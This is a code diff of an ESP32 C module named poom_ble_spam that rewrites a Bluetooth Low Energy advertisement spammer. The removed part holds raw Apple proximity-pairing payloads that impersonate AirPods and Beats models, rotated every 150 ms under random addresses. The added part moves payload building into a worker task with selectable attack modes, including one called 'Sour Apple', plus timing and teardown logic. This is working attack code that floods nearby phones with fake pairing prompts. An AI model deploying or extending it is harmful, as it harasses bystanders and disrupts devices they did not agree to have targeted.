@@ -1,333 +1,247 @@
 // SPDX-License-Identifier: MIT
 // Copyright (c) 2026 THE POOM
-
 #include "poom_ble_spam.h"
-
-#include <stdbool.h>
-#include <stdint.h>
 #include <stdio.h>
 #include <string.h>
-
 #include "esp_bt.h"
 #include "esp_bt_main.h"
-#include "esp_err.h"
 #include "esp_gap_ble_api.h"
 #include "esp_random.h"
-
+#include "esp_timer.h"
 #include "freertos/FreeRTOS.h"
-#include "freertos/timers.h"
+#include "freertos/queue.h"
+#include "freertos/task.h"
 
-/**
- * @file poom_ble_spam.c
- * @brief BLE advertisement payload rotator application.
- */
-
-/* =========================
- * Local log macros (printf)
- * ========================= */
-#if POOM_BLE_SPAM_LOG_ENABLED
-    static const char *POOM_BLE_SPAM_TAG = "poom_ble_spam";
-
-    #define POOM_BLE_SPAM_PRINTF_E(fmt, ...) \
-        printf("[E] [%s] %s:%d: " fmt "\n", POOM_BLE_SPAM_TAG, __func__, __LINE__, ##__VA_ARGS__)
-
-    #define POOM_BLE_SPAM_PRINTF_W(fmt, ...) \
-        printf("[W] [%s] %s:%d: " fmt "\n", POOM_BLE_SPAM_TAG, __func__, __LINE__, ##__VA_ARGS__)
-
-    #define POOM_BLE_SPAM_PRINTF_I(fmt, ...) \
-        printf("[I] [%s] %s:%d: " fmt "\n", POOM_BLE_SPAM_TAG, __func__, __LINE__, ##__VA_ARGS__)
-
-    #if POOM_BLE_SPAM_DEBUG_LOG_ENABLED
-        #define POOM_BLE_SPAM_PRINTF_D(fmt, ...) \
-            printf("[D] [%s] %s:%d: " fmt "\n", POOM_BLE_SPAM_TAG, __func__, __LINE__, ##__VA_ARGS__)
-    #else
-        #define POOM_BLE_SPAM_PRINTF_D(...) do { } while (0)
-    #endif
-#else
-    #define POOM_BLE_SPAM_PRINTF_E(...) do { } while (0)
-    #define POOM_BLE_SPAM_PRINTF_W(...) do { } while (0)
-    #define POOM_BLE_SPAM_PRINTF_I(...) do { } while (0)
-    #define POOM_BLE_SPAM_PRINTF_D(...) do { } while (0)
-#endif
-
-/* =========================
- * Local constants
- * ========================= */
-#define ARRAY_LEN(x)                               (sizeof(x) / sizeof((x)[0]))
-
-#define POOM_BLE_SPAM_ADV_DATA_LEN                (31U)
-#define POOM_BLE_SPAM_DEFAULT_DWELL_MS            (150U)
-#define POOM_BLE_SPAM_ADV_INTERVAL_FAST           (0x20U)
-#define POOM_BLE_SPAM_ADDR_CLEAR_MASK             (0x3FU)
-#define POOM_BLE_SPAM_ADDR_STATIC_MASK            (0xC0U)
-#define POOM_BLE_SPAM_ADDR_MIX_FACTOR_A           (31U)
-#define POOM_BLE_SPAM_ADDR_MIX_FACTOR_B           (47U)
-#define POOM_BLE_SPAM_TIMER_NAME                  "bleSpamCut"
-
-/* =========================
- * Device payload database
- * ========================= */
-static const uint8_t s_device_adv_raw[][POOM_BLE_SPAM_ADV_DATA_LEN] = {
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x09,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x17,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-};
-
-static const char *s_device_names[] = {
-    "Airpods",
-    "Airpods Pro",
-    "Airpods Max",
-    "Airpods Gen 2",
-    "Airpods Gen 3",
-    "Airpods Pro Gen 2",
-    "Power Beats",
-    "Power Beats Pro",
-    "Beats Solo Pro",
-    "Beats Studio Buds",
-    "Beats Flex",
-    "Beats X",
-    "Beats Solo 3",
-    "Beats Studio 3",
-    "Beats Studio Pro",
-    "Beats Fit Pro",
-    "Beats Studio Buds Plus",
-};
-
-/* =========================
- * Local state
- * ========================= */
-static uint32_t s_dwell_ms = POOM_BLE_SPAM_DEFAULT_DWELL_MS;
-static bool s_running = false;
-static int s_current_device_idx = -1;
-static TimerHandle_t s_adv_cut_timer = NULL;
-static poom_ble_spam_cb_display s_display_cb = NULL;
-
-static esp_ble_adv_params_t s_adv_params = {
-    .adv_int_min = POOM_BLE_SPAM_ADV_INTERVAL_FAST,
-    .adv_int_max = POOM_BLE_SPAM_ADV_INTERVAL_FAST,
-    .adv_type = ADV_TYPE_NONCONN_IND,
-    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
-    .channel_map = ADV_CHNL_ALL,
-    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
-};
-
-/* =========================
- * Local helpers
- * ========================= */
-/**
- * @brief Fills a buffer with pseudo-random bytes from ESP RNG.
- *
- * @param buffer Output buffer.
- * @param size Number of bytes to fill.
- */
-static void poom_ble_spam_fill_random_bytes_(uint8_t *buffer, size_t size)
+typedef struct { esp_gap_ble_cb_event_t event; int status; } adv_event_t;
+static portMUX_TYPE lock = portMUX_INITIALIZER_UNLOCKED;
+static QueueHandle_t events;
+static bool stopping, overflow, controller_owned, controller_enabled, host_owned, host_enabled;
+static bool duration_expired;
+static poom_ble_spam_config_t config;
+static poom_ble_spam_status_t status={.radio_released=true};
+static uint32_t started_ms;
+static poom_ble_spam_cb_display display_callback;
+static uint32_t now_(void) { return (uint32_t)(esp_timer_get_time()/1000LL); }
+static bool cancelled_(void)
 {
-    size_t offset = 0U;
-    while (offset < size)
-    {
-        uint32_t rnd = esp_random();
-        size_t remaining = size - offset;
-        size_t chunk = (remaining < sizeof(rnd)) ? remaining : sizeof(rnd);
-        memcpy(&buffer[offset], &rnd, chunk);
-        offset += chunk;
-    }
+    portENTER_CRITICAL(&lock);
+    const bool value=stopping;
+    portEXIT_CRITICAL(&lock);
+    return value;
 }
-
-/**
- * @brief Applies a random static BLE address mixed with a payload index.
- *
- * @param idx Payload index.
- */
-static void poom_ble_spam_set_random_addr_for_index_(int idx)
+static void gap_(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
 {
-    esp_bd_addr_t random_addr = {0};
-    poom_ble_spam_fill_random_bytes_(random_addr, sizeof(random_addr));
-
-    random_addr[0] = (uint8_t)((random_addr[0] & POOM_BLE_SPAM_ADDR_CLEAR_MASK) | POOM_BLE_SPAM_ADDR_STATIC_MASK);
-    random_addr[5] ^= (uint8_t)(idx * (int)POOM_BLE_SPAM_ADDR_MIX_FACTOR_A);
-    random_addr[4] ^= (uint8_t)(idx * (int)POOM_BLE_SPAM_ADDR_MIX_FACTOR_B);
-
-    esp_err_t ret = esp_ble_gap_set_rand_addr(random_addr);
-    if (ret != ESP_OK)
-    {
-        POOM_BLE_SPAM_PRINTF_W("set random addr failed: %s", esp_err_to_name(ret));
+    adv_event_t e={.event=event};
+    switch(event) {
+    case ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT: e.status=param->set_rand_addr_cmpl.status; break;
+    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT: e.status=param->adv_data_raw_cmpl.status; break;
+    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT: e.status=param->adv_start_cmpl.status; break;
+    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT: e.status=param->adv_stop_cmpl.status; break;
+    default:return;
     }
+    portENTER_CRITICAL(&lock);
+    if(events && xQueueSend(events,&e,0)!=pdTRUE) overflow=true;
+    portEXIT_CRITICAL(&lock);
 }
-
-/**
- * @brief Selects and configures the next ADV payload.
- */
-static void poom_ble_spam_prepare_next_device_(void)
+static esp_err_t wait_(esp_gap_ble_cb_event_t expected, bool allow_cancel)
 {
-    s_current_device_idx++;
-    if (s_current_device_idx >= (int)ARRAY_LEN(s_device_adv_raw))
-    {
-        s_current_device_idx = 0;
+    const uint32_t start=now_();
+    while((uint32_t)(now_()-start)<3000U) {
+        if(allow_cancel && cancelled_()) return ESP_ERR_INVALID_STATE;
+        if(allow_cancel && (uint32_t)(now_()-started_ms)>=config.duration_ms) {
+            duration_expired=true;
+            return ESP_ERR_TIMEOUT;
+        }
+        portENTER_CRITICAL(&lock);
+        const bool full=overflow;
+        portEXIT_CRITICAL(&lock);
+        if(full) return ESP_ERR_NO_MEM;
+        adv_event_t e;
+        if(xQueueReceive(events,&e,pdMS_TO_TICKS(20))!=pdTRUE) continue;
+        if(e.event==expected) return e.status==ESP_BT_STATUS_SUCCESS?ESP_OK:ESP_FAIL;
     }
-
-    poom_ble_spam_set_random_addr_for_index_(s_current_device_idx);
-
-    if (s_display_cb != NULL)
-    {
-        s_display_cb(s_device_names[s_current_device_idx]);
-    }
-
-    esp_err_t ret = esp_ble_gap_config_adv_data_raw((uint8_t *)s_device_adv_raw[s_current_device_idx],
-                                                     POOM_BLE_SPAM_ADV_DATA_LEN);
-    if (ret != ESP_OK)
-    {
-        POOM_BLE_SPAM_PRINTF_E("config adv raw failed: %s", esp_err_to_name(ret));
-    }
+    return ESP_ERR_TIMEOUT;
 }
-
-/**
- * @brief FreeRTOS timer callback to stop current advertising cycle.
- *
- * @param timer Timer handle (unused).
- */
-static void poom_ble_spam_adv_cut_timer_cb_(TimerHandle_t timer)
+static esp_err_t initialize_(void)
 {
-    (void)timer;
-    (void)esp_ble_gap_stop_advertising();
+    if(esp_bt_controller_get_status()!=ESP_BT_CONTROLLER_STATUS_IDLE ||
+       esp_bluedroid_get_status()!=ESP_BLUEDROID_STATUS_UNINITIALIZED) return ESP_ERR_INVALID_STATE;
+    esp_bt_controller_config_t bt=BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+    esp_err_t error=esp_bt_controller_init(&bt);
+    if(error!=ESP_OK)return error;
+    controller_owned=true;
+    if((error=esp_bt_controller_enable(ESP_BT_MODE_BLE))!=ESP_OK)return error;
+    controller_enabled=true;
+    if((error=esp_bluedroid_init())!=ESP_OK)return error;
+    host_owned=true;
+    if((error=esp_bluedroid_enable())!=ESP_OK)return error;
+    host_enabled=true;
+    return esp_ble_gap_register_callback(gap_);
 }
-
-/**
- * @brief GAP callback implementing the ADV rotation state machine.
- *
- * @param event GAP event.
- * @param param GAP event data.
- */
-static void poom_ble_spam_gap_cb_(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
+static esp_err_t cleanup_(void)
 {
-    switch (event)
-    {
-        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
-            if (param->adv_data_cmpl.status == ESP_BT_STATUS_SUCCESS)
-            {
-                esp_err_t ret = esp_ble_gap_start_advertising(&s_adv_params);
-                if (ret != ESP_OK)
-                {
-                    POOM_BLE_SPAM_PRINTF_E("start advertising failed: %s", esp_err_to_name(ret));
-                }
-            }
-            else
-            {
-                POOM_BLE_SPAM_PRINTF_E("adv raw set failed: status=%d", (int)param->adv_data_cmpl.status);
-            }
-            break;
-
-        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
-            if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS)
-            {
-                if (s_adv_cut_timer != NULL)
-                {
-                    (void)xTimerStop(s_adv_cut_timer, 0);
-                    (void)xTimerChangePeriod(s_adv_cut_timer, pdMS_TO_TICKS(s_dwell_ms), 0);
-                    (void)xTimerStart(s_adv_cut_timer, 0);
-                }
-            }
-            else
-            {
-                POOM_BLE_SPAM_PRINTF_E("adv start failed: status=%d", (int)param->adv_start_cmpl.status);
-            }
-            break;
-
-        case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
-            if (s_running)
-            {
-                poom_ble_spam_prepare_next_device_();
-            }
-            break;
-
-        default:
-            break;
+    esp_err_t first=ESP_OK,error;
+    if(host_enabled) {
+        error=esp_bluedroid_disable();
+        if(error==ESP_OK)host_enabled=false;else first=error;
     }
+    if(host_owned && !host_enabled) {
+        error=esp_bluedroid_deinit();
+        if(error==ESP_OK)host_owned=false;else if(first==ESP_OK)first=error;
+    }
+    if(controller_enabled && !host_enabled) {
+        error=esp_bt_controller_disable();
+        if(error==ESP_OK)controller_enabled=false;else if(first==ESP_OK)first=error;
+    }
+    if(controller_owned && !controller_enabled && !host_owned) {
+        error=esp_bt_controller_deinit();
+        if(error==ESP_OK)controller_owned=false;else if(first==ESP_OK)first=error;
+    }
+    return first;
 }
-
-/**
- * @brief Initializes BLE controller and Bluedroid stack.
- */
-static void poom_ble_spam_bt_init_stack_(void)
+static esp_err_t stop_advertising_(void)
 {
-    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));
-
-    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
-    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_BLE));
-    ESP_ERROR_CHECK(esp_bluedroid_init());
-    ESP_ERROR_CHECK(esp_bluedroid_enable());
+    const esp_err_t submitted=esp_ble_gap_stop_advertising();
+    const esp_err_t error=submitted==ESP_OK?wait_(ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT,false):submitted;
+    if(error==ESP_OK) {
+        portENTER_CRITICAL(&lock);
+        status.advertising=false;
+        portEXIT_CRITICAL(&lock);
+    }
+    return error;
 }
-
-/* =========================
- * Public API
- * ========================= */
-/**
- * @brief Registers a callback used to expose the currently advertised label.
- *
- * @param callback Callback function. Pass NULL to clear.
- */
+static void worker_(void *arg)
+{
+    (void)arg;
+    esp_err_t error=cancelled_()?ESP_ERR_INVALID_STATE:initialize_();
+    uint32_t sequence=0;
+    const esp_ble_adv_params_t parameters={.adv_int_min=0xa0,.adv_int_max=0xa0,
+        .adv_type=ADV_TYPE_NONCONN_IND,.own_addr_type=BLE_ADDR_TYPE_RANDOM,
+        .channel_map=ADV_CHNL_ALL,.adv_filter_policy=ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY};
+    while(error==ESP_OK && !cancelled_() && (uint32_t)(now_()-started_ms)<config.duration_ms) {
+        uint8_t payload[31],address[6];
+        char label[24];
+        const size_t length=poom_ble_payload_build(config.mode,sequence,esp_random(),payload,label);
+        if(!length) {error=ESP_ERR_INVALID_ARG;break;}
+        esp_fill_random(address,sizeof(address));
+        address[0]=(uint8_t)((address[0]&0x3fU)|0xc0U);
+        address[5]=(uint8_t)((address[5]&0xfcU)|1U);
+        error=esp_ble_gap_set_rand_addr(address);
+        if(error==ESP_OK)error=wait_(ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT,true);
+        if(error==ESP_OK)error=esp_ble_gap_config_adv_data_raw(payload,(uint32_t)length);
+        if(error==ESP_OK)error=wait_(ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT,true);
+        esp_ble_adv_params_t mutable_parameters=parameters;
+        if(error==ESP_OK)error=esp_ble_gap_start_advertising(&mutable_parameters);
+        if(error==ESP_OK)error=wait_(ESP_GAP_BLE_ADV_START_COMPLETE_EVT,true);
+        if(error!=ESP_OK)break;
+        portENTER_CRITICAL(&lock);
+        status.advertising=true;
+        ++status.cycles;
+        memcpy(status.label,label,sizeof(status.label));
+        poom_ble_spam_cb_display callback=display_callback;
+        portEXIT_CRITICAL(&lock);
+        if(callback)callback(label);
+        const uint32_t cycle_start=now_();
+        const poom_ble_spam_mode_t family=config.mode==POOM_BLE_SPAM_ALL?
+            (poom_ble_spam_mode_t)(sequence%POOM_BLE_SPAM_ALL):config.mode;
+        const uint32_t dwell=config.dwell_ms?config.dwell_ms:family==POOM_BLE_SPAM_SOUR_APPLE?150U:500U;
+        while(!cancelled_() && (uint32_t)(now_()-cycle_start)<dwell &&
+              (uint32_t)(now_()-started_ms)<config.duration_ms) vTaskDelay(pdMS_TO_TICKS(10));
+        error=stop_advertising_();
+        ++sequence;
+    }
+    /* Callbacks only report completions; they never start/rotate advertisements.
+     * Host teardown also cancels a start whose ACK was not consumed on stop. */
+    const esp_err_t released=cleanup_();
+    if(released!=ESP_OK)error=released;
+    portENTER_CRITICAL(&lock);
+    status.error=released==ESP_OK && ((stopping && error==ESP_ERR_INVALID_STATE) ||
+                 (duration_expired && error==ESP_ERR_TIMEOUT))?ESP_OK:error;
+    status.elapsed_ms=(uint32_t)(now_()-started_ms);
+    status.radio_released=!host_owned && !controller_owned;
+    if(status.radio_released)status.advertising=false;
+    QueueHandle_t old=events;
+    events=NULL;
+    portEXIT_CRITICAL(&lock);
+    vQueueDelete(old);
+    portENTER_CRITICAL(&lock);
+    status.active=false;
+    portEXIT_CRITICAL(&lock);
+    vTaskDelete(NULL);
+}
 void poom_ble_spam_register_cb(poom_ble_spam_cb_display callback)
 {
-    s_display_cb = callback;
+    portENTER_CRITICAL(&lock);
+    display_callback=callback;
+    portEXIT_CRITICAL(&lock);
 }
-
-/**
- * @brief Starts BLE payload rotation.
- */
-void poom_ble_spam_start(void)
+esp_err_t poom_ble_spam_start_mode(const poom_ble_spam_config_t *requested)
 {
-    poom_ble_spam_bt_init_stack_();
-    ESP_ERROR_CHECK(esp_ble_gap_register_callback(poom_ble_spam_gap_cb_));
-
-    if (s_adv_cut_timer == NULL)
-    {
-        s_adv_cut_timer = xTimerCreate(POOM_BLE_SPAM_TIMER_NAME,
-                                       pdMS_TO_TICKS(s_dwell_ms),
-                                       pdFALSE,
-                                       NULL,
-                                       poom_ble_spam_adv_cut_timer_cb_);
+    if(!requested || (unsigned)requested->mode>=POOM_BLE_SPAM_MODE_COUNT || requested->duration_ms>60000U ||
+       (requested->duration_ms && requested->duration_ms<1000U) ||
+       (requested->dwell_ms && (requested->dwell_ms<100U || requested->dwell_ms>5000U))) return ESP_ERR_INVALID_ARG;
+    portENTER_CRITICAL(&lock);
+    if(status.active || controller_owned || host_owned) {portEXIT_CRITICAL(&lock);return ESP_ERR_INVALID_STATE;}
+    memset(&status,0,sizeof(status));
+    config=*requested;
+    if(!config.duration_ms)config.duration_ms=30000U;
+    status.duration_ms=config.duration_ms;
+    status.mode=config.mode;
+    status.active=true;
+    stopping=overflow=false;
+    duration_expired=false;
+    started_ms=now_();
+    portEXIT_CRITICAL(&lock);
+    QueueHandle_t queue=xQueueCreate(8,sizeof(adv_event_t));
+    portENTER_CRITICAL(&lock);
+    events=queue;
+    portEXIT_CRITICAL(&lock);
+    if(!queue || xTaskCreate(worker_,"ble_advert",4096,NULL,4,NULL)!=pdPASS) {
+        if(queue)vQueueDelete(queue);
+        portENTER_CRITICAL(&lock);
+        events=NULL;
+        status.active=false;
+        status.radio_released=true;
+        status.error=ESP_ERR_NO_MEM;
+        portEXIT_CRITICAL(&lock);
+        return ESP_ERR_NO_MEM;
     }
-
-    s_running = true;
-    s_current_device_idx = -1;
-    poom_ble_spam_prepare_next_device_();
-    POOM_BLE_SPAM_PRINTF_I("started");
+    return ESP_OK;
 }
-
-/**
- * @brief Stops BLE payload rotation.
- */
-void poom_ble_spam_app_stop(void) 
+esp_err_t poom_ble_spam_start(void)
 {
-    if (!s_running) return;
-
-    if (s_adv_cut_timer != NULL) {
-        xTimerStop(s_adv_cut_timer, 0);
-    }
-    esp_ble_gap_stop_advertising();
-
-    esp_bluedroid_disable();
-    esp_bluedroid_deinit();
-
-    esp_bt_controller_disable();
-    esp_bt_controller_deinit();
-
-    s_running = false;
-    s_current_device_idx = -1;
-
-    POOM_BLE_SPAM_PRINTF_I("stopped and deinitialized");
+    const poom_ble_spam_config_t defaults={.mode=POOM_BLE_SPAM_APPLE_DEVICES};
+    return poom_ble_spam_start_mode(&defaults);
+}
+bool poom_ble_spam_is_active(void)
+{
+    portENTER_CRITICAL(&lock);
+    const bool active=status.active;
+    portEXIT_CRITICAL(&lock);
+    return active;
+}
+esp_err_t poom_ble_spam_stop(void)
+{
+    portENTER_CRITICAL(&lock);
+    stopping=true;
+    portEXIT_CRITICAL(&lock);
+    while(poom_ble_spam_is_active())vTaskDelay(pdMS_TO_TICKS(10));
+    portENTER_CRITICAL(&lock);
+    const esp_err_t error=host_owned || controller_owned?(status.error?status.error:ESP_ERR_INVALID_STATE):ESP_OK;
+    portEXIT_CRITICAL(&lock);
+    return error;
+}
+void poom_ble_spam_app_stop(void)
+{
+    const esp_err_t error=poom_ble_spam_stop();
+    if(error!=ESP_OK)printf("[poom_ble_spam] Bluetooth release failed: 0x%x\n",(unsigned)error);
+}
+void poom_ble_spam_get_status(poom_ble_spam_status_t *out)
+{
+    if(!out)return;
+    const uint32_t now=now_();
+    portENTER_CRITICAL(&lock);
+    *out=status;
+    if(out->active)out->elapsed_ms=(uint32_t)(now-started_ms);
+    portEXIT_CRITICAL(&lock);
 }
